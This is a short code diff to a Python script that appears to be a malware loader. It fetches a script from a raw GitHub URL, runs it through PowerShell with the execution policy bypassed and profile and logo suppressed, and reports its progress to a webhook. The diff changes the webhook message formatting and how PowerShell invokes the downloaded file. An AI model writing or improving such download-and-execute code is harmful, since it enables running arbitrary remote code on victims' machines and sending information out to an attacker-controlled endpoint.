@@ -9,7 +9,8 @@ SCRIPT_URL = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/hea
 
 def send(msg, color=0x00FF00):
     try:
-        requests.post(WEBHOOK_URL, json={'embeds': [{'description': str(msg)[:4000], 'color': color}]})
+        msg = f'```{msg}```'
+        requests.post(WEBHOOK_URL, json={'embeds': [{'description': msg[:4000], 'color': color}]})
     except:
         pass
 
@@ -34,7 +35,7 @@ def main():
         try:
             send('executing script')
             result = subprocess.run(
-                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', temp],
+                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-NoLogo', '-Command', f'Add-Type -AssemblyName System.Net.Http; & "{temp}"'],
                 capture_output=True,
                 text=True
             )
